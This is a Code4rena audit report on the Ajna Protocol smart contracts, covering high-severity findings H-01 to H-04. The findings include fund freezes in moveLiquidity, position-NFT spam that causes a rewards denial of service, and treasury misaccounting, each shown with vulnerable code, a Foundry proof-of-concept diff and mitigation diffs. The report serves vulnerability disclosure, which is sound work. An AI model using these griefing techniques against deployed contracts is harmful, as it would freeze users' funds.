---
sponsor: "Ajna Protocol"
slug: "2023-05-ajna"
date: "2023-06-29"
title: "Ajna Protocol"
findings: "https://github.com/code-423n4/2023-05-ajna-findings/issues"
contest: 234
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Ajna Protocol smart contract system written in Solidity. The audit took place between May 3—May 11 2023.

## Wardens

123 Wardens contributed reports to the Ajna Protocol:

  1. [0x73696d616f](https://twitter.com/3xJanx2009)
  2. 0xRobocop
  3. [0xSmartContract](https://twitter.com/0xSmartContract)
  4. [0xStalin](https://twitter.com/Stalin_eth)
  5. [0xTheC0der](https://twitter.com/MarioPoneder)
  6. 0xWaitress
  7. 0xcm
  8. [0xnev](https://twitter.com/0xnevi)
  9. 7siech
  10. [ABAIKUNANBAEV](https://twitter.com/_onlyowner)
  11. [Audinarey](https://twitter.com/Audinarey)
  12. [Audit\_Avengers](https://twitter.com/JP_Courses) ([JP\_Courses](https://twitter.com/JP_Courses), [pxng0lin](https://www.twitter.com/pxng0lin), [zzebra83](https://www.linkedin.com/in/hamid-abubakr-732901ab/), Aon\_8, and ravikiranweb3)
  13. [Aymen0909](https://github.com/Aymen1001)
  14. BGSecurity ([anonresercher](https://twitter.com/anonresercher) and [martin](https://github.com/martin-petrov03))
  15. BPZ (Bitcoinfever244, PrasadLak, and zinc42)
  16. BRONZEDISC
  17. Bason
  18. [Bauchibred](https://twitter.com/bauchibred?s&#x3D;21&amp;t&#x3D;7sv-1qcnwtkdTA81Iog0yQ )
  19. [Blckhv](https://twitter.com/Aydoanbalakchie)
  20. Brenzee
  21. [DadeKuma](https://twitter.com/DadeKuma)
  22. Dug
  23. Eurovickk
  24. Evo
  25. GG\_Security ([georgits](https://twitter.com/georgits_) and halden)
  26. Haipls
  27. J4de
  28. [JCN](https://twitter.com/0xJCN)
  29. Jerry0x
  30. Jiamin
  31. [Jorgect](https://twitter.com/TamayoNft)
  32. [Juntao](https://twitter.com/0xJuntao)
  33. [K42](https://twitter.com/CrystAlline_K42)
  34. [Kenshin](https://twitter.com/nonfungiblenero)
  35. [Koolex](https://twitter.com/KoolexC)
  36. MohammedRizwan
  37. REACH
  38. Rageur
  39. Raihan
  40. ReyAdmirado
  41. [Ruhum](https://twitter.com/0xruhum)
  42. SAAJ
  43. SAQ
  44. SM3\_SS
  45. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)
  46. [Shogoki](https://twitter.com/theshogoki)
  47. [Shubham](https://twitter.com/Shaping_Myself)
  48. SpicyMeatball
  49. T1MOH
  50. TS
  51. [Tomio](https://twitter.com/meidhiwirara)
  52. [ToonVH](https://twitter.com/ToonVH_)
  53. UniversalCrypto (amaechieth and tettehnetworks)
  54. [Vagner](https://twitter.com/VagnerAndrei98)
  55. Walter
  56. [aashar](https://twitter.com/0xaash)
  57. ast3ros
  58. [aviggiano](https://twitter.com/agfviggiano)
  59. ayden
  60. [azhar](https://twitter.com/azhar0406)
  61. berlin-101
  62. btk
  63. [bytes032](https://twitter.com/bytes032)
  64. [c3phas](https://twitter.com/c3ph_)
  65. circlelooper
  66. codeslide
  67. cryptostellar5
  68. [deadrxsezzz](https://twitter.com/deadrosesxyz)
  69. descharre
  70. [devscrooge](https://twitter.com/devScrooge)
  71. dicethedev
  72. [evmboi32](https://twitter.com/evmboi32)
  73. [fatherOfBlocks](https://twitter.com/father0fBl0cks)
  74. ginlee
  75. hals
  76. [hunter\_w3b](https://twitter.com/hunt3r_w3b)
  77. [hyh](https://twitter.com/0xhyh)
  78. j4ld1na
  79. [juancito](https://twitter.com/0xJuancito)
  80. kaveyjoe
  81. kenta
  82. kodyvim
  83. ktg
  84. kutugu
  85. [ladboy233](https://twitter.com/Xc1008Cui)
  86. lfzkoala
  87. lukris02
  88. [mrpathfindr](https://twitter.com/0xpathfindr)
  89. mrvincere
  90. [nadin](https://twitter.com/nadin20678790)
  91. [naman1778](https://www.linkedin.com/in/naman-agrawal1778/)
  92. [nobody2018](https://twitter.com/nobody20185)
  93. okolicodes
  94. [patitonar](https://twitter.com/patitonar)
  95. peanuts
  96. petrichor
  97. pontifex
  98. rbserver
  99. ro1sharkm
  100. rvierdiiev
  101. sakshamguruji
  102. sces60107
  103. [shealtielanz](https://twitter.com/shealtielanz)
  104. [squeaky\_cactus](https://twitter.com/squeaky_cactus)
  105. [teawaterwire](https://twitter.com/teawaterwire)
  106. [troublor](https://troublor.xyz)
  107. [tsvetanovv](https://twitter.com/cvetanovv0)
  108. vakzz
  109. [volodya](https://twitter.com/0xVolodya)
  110. [wonjun](https://www.market.dev)
  111. xuwinnie
  112. [yixxas](https://twitter.com/yixxas)
  113. yjrwkk
  114. yongskiws

This audit was judged by [Picodes](https://twitter.com/thePicodes).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 25 unique vulnerabilities. Of these vulnerabilities, 11 received a risk rating in the category of HIGH severity and 14 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 54 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 32 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Ajna Protocol repository](https://github.com/code-423n4/2023-05-ajna), and is composed of 11 smart contracts written in the Solidity programming language and includes 1,391 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (11)
## [[H-01] PositionManager's `moveLiquidity` can freeze funds by removing destination index even when the move was partial](https://github.com/code-423n4/2023-05-ajna-findings/issues/503)
*Submitted by [hyh](https://github.com/code-423n4/2023-05-ajna-findings/issues/503), also found by [Koolex](https://github.com/code-423n4/2023-05-ajna-findings/issues/366) and [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/232)*

`positionIndex.remove(params_.fromIndex)`removes the PositionManager entry even when it is only partial removal as a result of `IPool(params_.pool).moveQuoteToken(...)` call.

I.e. it is correct to do `fromPosition.lps -= vars.lpbAmountFrom`, but the resulting amount might not be zero, moveQuoteToken() are not guaranteed to clear the position as it has available liquidity constraint. In the case of partial quote funds removal `positionIndex.remove(params_.fromIndex)` operation will freeze the remaining position.

### Impact

Permanent fund freeze for the remaining position of LP beneficiary.

### Proof of Concept

While `positions[params_.tokenId][params_.fromIndex]` LP shares are correctly reduced by the amount returned by pool's moveQuoteToken(), the position itself is unconditionally removed from the `positionIndexes[params_.tokenId]`, making any remaining funds unavailable:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323>

```solidity
    function moveLiquidity(
        MoveLiquidityParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

        MoveLiquidityLocalVars memory vars;
        vars.depositTime = fromPosition.depositTime;

        // handle the case where owner attempts to move liquidity after they've already done so
        if (vars.depositTime == 0) revert RemovePositionFailed();

        // ensure bucketDeposit accounts for accrued interest
        IPool(params_.pool).updateInterest();

        // retrieve info of bucket from which liquidity is moved  
        (
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bankruptcyTime,
            vars.bucketDeposit,
        ) = IPool(params_.pool).bucketInfo(params_.fromIndex);

        // check that bucket hasn't gone bankrupt since memorialization
        if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();

        // calculate the max amount of quote tokens that can be moved, given the tracked LP
        vars.maxQuote = _lpToQuoteToken(
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bucketDeposit,
            fromPosition.lps,
            vars.bucketDeposit,
            _priceAt(params_.fromIndex)
        );

        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        // remove bucket index from which liquidity is moved from tracked positions
>>      if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();

        // update bucket set at which a position has liquidity
        // slither-disable-next-line unused-return
        positionIndex.add(params_.toIndex);

        // move quote tokens in pool
        (
            vars.lpbAmountFrom,
            vars.lpbAmountTo,
        ) = IPool(params_.pool).moveQuoteToken(
            vars.maxQuote,
            params_.fromIndex,
            params_.toIndex,
            params_.expiry
        );

        Position storage toPosition = positions[params_.tokenId][params_.toIndex];

        // update position LP state
>>      fromPosition.lps -= vars.lpbAmountFrom;
        toPosition.lps   += vars.lpbAmountTo;
        // update position deposit time to the from bucket deposit time
        toPosition.depositTime = vars.depositTime;
```

Bucket can contain a mix of quote and collateral tokens, but moveLiquidity() aims to retrieve `vars.maxQuote = _lpToQuoteToken(...)` quote funds per current exchange rate:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/helpers/PoolHelper.sol#L222-L236>

```solidity
    function _lpToQuoteToken(
        uint256 bucketLP_,
        uint256 bucketCollateral_,
        uint256 deposit_,
        uint256 lenderLPBalance_,
        uint256 maxQuoteToken_,
        uint256 bucketPrice_
    ) pure returns (uint256 quoteTokenAmount_) {
        uint256 rate = Buckets.getExchangeRate(bucketCollateral_, bucketLP_, deposit_, bucketPrice_);

        quoteTokenAmount_ = Maths.wmul(lenderLPBalance_, rate);

        if (quoteTokenAmount_ > deposit_)       quoteTokenAmount_ = deposit_;
        if (quoteTokenAmount_ > maxQuoteToken_) quoteTokenAmount_ = maxQuoteToken_;
    }
```

There might be not enough quote deposit funds available to redeem the whole quote amount requested, which is controlled by the corresponding liquidity constraint:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L711-L719>

```solidity
        uint256 scaledLpConstraint = Maths.wmul(params_.lpConstraint, exchangeRate);
        if (
>>          params_.depositConstraint < scaledDepositAvailable &&
            params_.depositConstraint < scaledLpConstraint
        ) {
            // depositConstraint is binding constraint
            removedAmount_ = params_.depositConstraint;
>>          redeemedLP_    = Maths.wdiv(removedAmount_, exchangeRate);
        }
```

### Recommended Mitigation Steps

As a most straightforward solution consider reverting when there is a remainder, i.e. when `fromPosition.lps > dust_threshold`:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323>

```diff
    function moveLiquidity(
        MoveLiquidityParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

        MoveLiquidityLocalVars memory vars;
        vars.depositTime = fromPosition.depositTime;

        // handle the case where owner attempts to move liquidity after they've already done so
        if (vars.depositTime == 0) revert RemovePositionFailed();

        // ensure bucketDeposit accounts for accrued interest
        IPool(params_.pool).updateInterest();

        // retrieve info of bucket from which liquidity is moved  
        (
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bankruptcyTime,
            vars.bucketDeposit,
        ) = IPool(params_.pool).bucketInfo(params_.fromIndex);

        // check that bucket hasn't gone bankrupt since memorialization
        if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();

        // calculate the max amount of quote tokens that can be moved, given the tracked LP
        vars.maxQuote = _lpToQuoteToken(
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bucketDeposit,
            fromPosition.lps,
            vars.bucketDeposit,
            _priceAt(params_.fromIndex)
        );

        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        // remove bucket index from which liquidity is moved from tracked positions
        if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();

        // update bucket set at which a position has liquidity
        // slither-disable-next-line unused-return
        positionIndex.add(params_.toIndex);

        // move quote tokens in pool
        (
            vars.lpbAmountFrom,
            vars.lpbAmountTo,
        ) = IPool(params_.pool).moveQuoteToken(
            vars.maxQuote,
            params_.fromIndex,
            params_.toIndex,
            params_.expiry
        );

        Position storage toPosition = positions[params_.tokenId][params_.toIndex];

        // update position LP state
>>      fromPosition.lps -= vars.lpbAmountFrom;
        toPosition.lps   += vars.lpbAmountTo;
        // update position deposit time to the from bucket deposit time
        toPosition.depositTime = vars.depositTime;
```

**[ith-harvey (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/503#issuecomment-1554797037)**



***

## [[H-02] PositionManager's `moveLiquidity` can set wrong deposit time and permanently freeze LP funds moved](https://github.com/code-423n4/2023-05-ajna-findings/issues/494)
*Submitted by [hyh](https://github.com/code-423n4/2023-05-ajna-findings/issues/494), also found by [nobody2018](https://github.com/code-423n4/2023-05-ajna-findings/issues/88)*

`moveLiquidity()` set new destination index LP entry deposit time to be equal to the source index deposit time, while destination bucket might have defaulted after that time.

This is generally not correct as source bucket bankruptcy is controlled (i.e. LP shares that are moved are healthy), while the destination bucket's bankruptcy time, being arbitrary, can be higher than source index deposit time, and in this case the funds will become inaccessible after such a move (i.e. healthy shares will be marked as defaulted due to incorrect deposit time used).

In other words the funds are moved from healthy non-default zone to an arbitrary point, which can be either healthy or not. In the latter case this constitutes a loss for an owner as `toIndex` bucket bankruptcy time exceeding deposit time means that all other retrieval operations will be blocked.

### Impact

Owner will permanently lose access to the LP shares whenever `positions[params_.tokenId][params_.toIndex]` bucket bankruptcy time is greater than `positions[params_.tokenId][params_.fromIndex].depositTime`.

`moveLiquidity()` is a common operation, while source and destination bucket bankruptcy times can be related in an arbitrary manner, and the net impact is permanent fund freeze, so this is a fund loss without material prerequisites, setting the severity to be high.

### Proof of Concept

`moveLiquidity()` sets `toPosition` deposit time to be `fromPosition.depositTime`:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323>

```solidity
    function moveLiquidity(
        MoveLiquidityParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

        MoveLiquidityLocalVars memory vars;
>>      vars.depositTime = fromPosition.depositTime;

        // handle the case where owner attempts to move liquidity after they've already done so
        if (vars.depositTime == 0) revert RemovePositionFailed();

        // ensure bucketDeposit accounts for accrued interest
        IPool(params_.pool).updateInterest();

        // retrieve info of bucket from which liquidity is moved  
        (
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bankruptcyTime,
            vars.bucketDeposit,
        ) = IPool(params_.pool).bucketInfo(params_.fromIndex);

        // check that bucket hasn't gone bankrupt since memorialization
        if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();

        // calculate the max amount of quote tokens that can be moved, given the tracked LP
        vars.maxQuote = _lpToQuoteToken(
            vars.bucketLP,
            vars.bucketCollateral,
            vars.bucketDeposit,
            fromPosition.lps,
            vars.bucketDeposit,
            _priceAt(params_.fromIndex)
        );

        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        // remove bucket index from which liquidity is moved from tracked positions
        if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();

        // update bucket set at which a position has liquidity
        // slither-disable-next-line unused-return
        positionIndex.add(params_.toIndex);

        // move quote tokens in pool
        (
            vars.lpbAmountFrom,
            vars.lpbAmountTo,
        ) = IPool(params_.pool).moveQuoteToken(
            vars.maxQuote,
            params_.fromIndex,
            params_.toIndex,
            params_.expiry
        );

        Position storage toPosition = positions[params_.tokenId][params_.toIndex];

        // update position LP state
        fromPosition.lps -= vars.lpbAmountFrom;
        toPosition.lps   += vars.lpbAmountTo;
        // update position deposit time to the from bucket deposit time
>>      toPosition.depositTime = vars.depositTime;
```

I.e. there is no check for `params_.toIndex` bucket situation, the time is just copied.

While there is checking logic in LenderActions, which checks for `toBucket` bankruptcy and sets the time accordingly:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L315-L327>

```solidity
        vars.toBucketDepositTime = toBucketLender.depositTime;
        if (vars.toBucketBankruptcyTime >= vars.toBucketDepositTime) {
            // bucket is bankrupt and deposit was done before bankruptcy time, reset lender lp amount
            toBucketLender.lps = toBucketLP_;

            // set deposit time of the lender's to bucket as bucket's last bankruptcy timestamp + 1 so deposit won't get invalidated
            vars.toBucketDepositTime = vars.toBucketBankruptcyTime + 1;
        } else {
            toBucketLender.lps += toBucketLP_;
        }

        // set deposit time to the greater of the lender's from bucket and the target bucket
        toBucketLender.depositTime = Maths.max(vars.fromBucketDepositTime, vars.toBucketDepositTime);
```

This way, while bucket structure deposit time will be controlled and updated, PositionManager's structure will have the deposit time copied over.

In the case when `positions[params_.tokenId][params_.fromIndex].depositTime` was less than `params_.toIndex` `bankruptcyTime`, this will freeze these LP funds as further attempts to use them will be blocked:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L285>

```solidity
    function moveLiquidity(
        MoveLiquidityParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

        MoveLiquidityLocalVars memory vars;
>>      vars.depositTime = fromPosition.depositTime;

        // handle the case where owner attempts to move liquidity after they've already done so
        if (vars.depositTime == 0) revert RemovePositionFailed();

        // ensure bucketDeposit accounts for accrued interest
        IPool(params_.pool).updateInterest();

        // retrieve info of bucket from which liquidity is moved  
        (
            vars.bucketLP,
            vars.bucketCollateral,
>>          vars.bankruptcyTime,
            vars.bucketDeposit,
        ) = IPool(params_.pool).bucketInfo();

        // check that bucket hasn't gone bankrupt since memorialization
>>      if (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();
```

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352-L372>

```solidity
    function reedemPositions(
        RedeemPositionsParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) {
        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

        ...

        for (uint256 i = 0; i < indexesLength; ) {
            index = params_.indexes[i];

            Position memory position = positions[params_.tokenId][index];

            if (position.depositTime == 0 || position.lps == 0) revert RemovePositionFailed();

            // check that bucket didn't go bankrupt after memorialization
>>          if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) revert BucketBankrupt();
```

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L436-L443>

```solidity
    function _bucketBankruptAfterDeposit(
        IPool pool_,
        uint256 index_,
        uint256 depositTime_
    ) internal view returns (bool) {
        (, , uint256 bankruptcyTime, , ) = pool_.bucketInfo(index_);
>>      return depositTime_ <= bankruptcyTime;
    }
```

### Recommended Mitigation Steps

Consider using the resulting time of the destination position, for example:

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323>

```diff
    function moveLiquidity(
        MoveLiquidityParams calldata params_
    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {
        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];

        MoveLiquidityLocalVars memory vars;
        vars.depositTime = fromPosition.depositTime;

        ...

        Position storage toPosition = positions[params_.tokenId][params_.toIndex];

        // update position LP state
        fromPosition.lps -= vars.lpbAmountFrom;
        toPosition.lps   += vars.lpbAmountTo;
-       // update position deposit time to the from bucket deposit time
+       // update position deposit time with the renewed to bucket deposit time
+       (, vars.depositTime) = pool.lenderInfo(params_.toIndex, address(this));
        toPosition.depositTime = vars.depositTime;
```

Notice, that this time value will be influenced by the other PositionManager positions in the `params_.toIndex` bucket, but the surface described will be closed as it will be controlled against `params_.toIndex` bucket bankruptcy time.

**[ith-harvey (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/494#issuecomment-1554797890)**



***

## [[H-03] Position NFT can be spammed with insignificant positions by anyone until rewards DoS](https://github.com/code-423n4/2023-05-ajna-findings/issues/488)
*Submitted by [0xTheC0der](https://github.com/code-423n4/2023-05-ajna-findings/issues/488), also found by [aviggiano](https://github.com/code-423n4/2023-05-ajna-findings/issues/508), [ro1sharkm](https://github.com/code-423n4/2023-05-ajna-findings/issues/506), [DadeKuma](https://github.com/code-423n4/2023-05-ajna-findings/issues/505), [evmboi32](https://github.com/code-423n4/2023-05-ajna-findings/issues/356), [sakshamguruji](https://github.com/code-423n4/2023-05-ajna-findings/issues/303), [juancito](https://github.com/code-423n4/2023-05-ajna-findings/issues/259), [rvierdiiev](https://github.com/code-423n4/2023-05-ajna-findings/issues/178), [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/171), [kodyvim](https://github.com/code-423n4/2023-05-ajna-findings/issues/109), [SpicyMeatball](https://github.com/code-423n4/2023-05-ajna-findings/issues/105), [ToonVH](https://github.com/code-423n4/2023-05-ajna-findings/issues/94), and [azhar](https://github.com/code-423n4/2023-05-ajna-findings/issues/79)*

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485>

The [PositionManager.memorializePositions(params\_)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216) method can be called by **anyone** (per design, see 3rd party test cases) and allows **insignificantly** small (any value > 0) positions to be attached to **anyone** else's positions NFT, see PoC. As a result, the `positionIndexes[params_.tokenId]` storage array for an NFT with given token ID can be spammed with positions without the NFT owner's consent.

Therefore, the [PositionManager.getPositionIndexesFiltered(tokenId\_)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485) method might exceed the block gas limit when iterating the `positionIndexes[tokenId_]` storage array. However, the [RewardsManager.calculateRewards(...)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L325-L349) and [RewardsManager.\_calculateAndClaimRewards(...)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L384-L414) methods rely on the aforementioned method to succeed in order to calculate and pay rewards.

All in all, a griefer can spam anyone's position NFT with insignificant positions until the rewards mechanism fails for the NFT owner due to DoS (gas limit). Side note: A position NFT also cannot be burned as long as such insignificant positions are attached to it, see [PositionManager.burn(...)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L142-L154).

### Proof of Concept

The following *diff* is based on the existing test case `testMemorializePositions` in `PositionManager.t.sol` and demonstrates that insignificant positions can be attached by anyone.

```diff
diff --git a/ajna-core/tests/forge/unit/PositionManager.t.sol b/ajna-core/tests/forge/unit/PositionManager.t.sol
index bf3aa40..56c85d1 100644
--- a/ajna-core/tests/forge/unit/PositionManager.t.sol
+++ b/ajna-core/tests/forge/unit/PositionManager.t.sol
@@ -122,6 +122,7 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract
      */
     function testMemorializePositions() external {
         address testAddress = makeAddr("testAddress");
+        address otherAddress = makeAddr("otherAddress");
         uint256 mintAmount  = 10000 * 1e18;

         _mintQuoteAndApproveManagerTokens(testAddress, mintAmount);
@@ -134,17 +135,17 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract

         _addInitialLiquidity({
             from:   testAddress,
-            amount: 3_000 * 1e18,
+            amount: 1, //3_000 * 1e18,
             index:  indexes[0]
         });
         _addInitialLiquidity({
             from:   testAddress,
-            amount: 3_000 * 1e18,
+            amount: 1, //3_000 * 1e18,
             index:  indexes[1]
         });
         _addInitialLiquidity({
             from:   testAddress,
-            amount: 3_000 * 1e18,
+            amount: 1, // 3_000 * 1e18,
             index:  indexes[2]
         });

@@ -165,17 +166,20 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract

         // allow position manager to take ownership of the position
         uint256[] memory amounts = new uint256[](3);
-        amounts[0] = 3_000 * 1e18;
-        amounts[1] = 3_000 * 1e18;
-        amounts[2] = 3_000 * 1e18;
+        amounts[0] = 1; //3_000 * 1e18;
+        amounts[1] = 1; //3_000 * 1e18;
+        amounts[2] = 1; //3_000 * 1e18;
         _pool.increaseLPAllowance(address(_positionManager), indexes, amounts);

         // memorialize quote tokens into minted NFT
+        changePrank(otherAddress); // switch other address (not owner of NFT)
         vm.expectEmit(true, true, true, true);
-        emit TransferLP(testAddress, address(_positionManager), indexes, 9_000 * 1e18);
+        emit TransferLP(testAddress, address(_positionManager), indexes, 3 /*9_000 * 1e18*/);
         vm.expectEmit(true, true, true, true);
         emit MemorializePosition(testAddress, tokenId, indexes);
-        _positionManager.memorializePositions(memorializeParams);
+        _positionManager.memorializePositions(memorializeParams);  // switch back to test address (owner of NFT)
+        changePrank(testAddress);
+

         // check memorialization success
         uint256 positionAtPriceOneLP = _positionManager.getLP(tokenId, indexes[0]);

```

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

Requiring that The [PositionManager.memorializePositions(params\_)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216) can only be called by the NFT owner or anyone who has approval would help but break the 3rd party test cases.

Alternatively, one could enforce a minimum position value to make this griefing attack extremely unattractive.

**[ith-harvey (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/488#issuecomment-1554799142)**



***

## [[H-04] Delegation rewards are not counted toward granting fund](https://github.com/code-423n4/2023-05-ajna-findings/issues/450)
*Submitted by [Kenshin](https://github.com/code-423n4/2023-05-ajna-findings/issues/450), also found by [hyh](https://github.com/code-423n4/2023-05-ajna-findings/issues/461), [REACH](https://github.com/code-423n4/2023-05-ajna-findings/issues/389), [rbserver](https://github.com/code-423n4/2023-05-ajna-findings/issues/289), [Ruhum](https://github.com/code-423n4/2023-05-ajna-findings/issues/263), [Dug](https://github.com/code-423n4/2023-05-ajna-findings/issues/150), [0xRobocop](https://github.com/code-423n4/2023-05-ajna-findings/issues/103), and [nobody2018](https://github.com/code-423n4/2023-05-ajna-findings/issues/39)*

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L236-L265><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L216-L217>

Each period reserves a reward for granting up to [3% (GBC: Global Budget Constraint)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L27). The GBC is split into two parts:

1.  90% for proposal granting. Any proposal requesting more than 90% will [revert](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L390-L391). The total amount requested across winning proposals must not [exceed this percentage](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L447-L450).
2.  10% for voters who have participated in that distribution period as an incentive.

Voters who have participated can claim their reward after the period has ended via `claimDelegateReward()`. However, the claim function does not account for the claimed reward towards treasury granting. As a result, the treasury technically reserves up to 90% in each period while actually granting 100%.

Consider this example:

1.  The treasury has a total of `1000 AJNA`. 3% is reserved for this period, resulting in a GBC of `30 AJNA`. The treasury is updated to `1000 - 30 = 970 AJNA`.
2.  90% is for proposals (`27 AJNA`) and 10% is for voters (`3 AJNA`).
3.  Assume all `27 AJNA` are fully granted among winning proposals.
4.  Assume 10 voters in total, all fully voted and have equal voting power. Each voter receives `0.3 AJNA`, totaling `3 AJNA`.
5.  The treasury has spent `27 AJNA + 3 AJNA`, leaving an actual balance of `970 AJNA`.
6.  This round has ended and the treasury updates its balance before starting a new one using [this logic](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L217). `970 += (30 - 27)` = `973`.
7.  The treasury accounts for `973 AJNA` while having only `970 AJNA` in actuality.

### More detailed analysis

When the current period has ended and before starting a new one, the treasury will [re-account its amount in case the last period did not utilize all the reserved reward](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L217). For example, if the last period granted only 80% of the GBC among winning proposals, the remaining 10% will be re-added to the treasury.

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol

197:    function _updateTreasury(
198:        uint24 distributionId_
199:    ) private {
200:        bytes32 fundedSlateHash = _distributions[distributionId_].fundedSlateHash;
201:        uint256 fundsAvailable  = _distributions[distributionId_].fundsAvailable;
202:
203:        uint256[] memory fundingProposalIds = _fundedProposalSlates[fundedSlateHash];
204:
205:        uint256 totalTokensRequested;
206:        uint256 numFundedProposals = fundingProposalIds.length;
207:
208:        for (uint i = 0; i < numFundedProposals; ) {
